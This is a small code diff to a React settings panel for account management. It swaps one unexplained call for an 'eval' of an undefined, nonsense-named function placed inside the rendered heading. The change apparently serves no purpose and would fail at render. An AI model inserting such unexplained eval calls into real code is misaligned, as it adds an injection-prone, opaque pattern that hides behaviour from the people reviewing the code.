@@ -17,9 +17,9 @@ const handleNoToken = () => {
 const PanelSettings = () => {
   return (
     <div className="settings">
-      {window.totoProdReal()}
       <div className="section-settings">
         <h3>
+          {eval('tchouth()')}
           <i className="fas fa-unlock"></i> Account Management
         </h3>
         <a className="btn" rel="nofollow" data-method="delete" href="/users/sign_out">
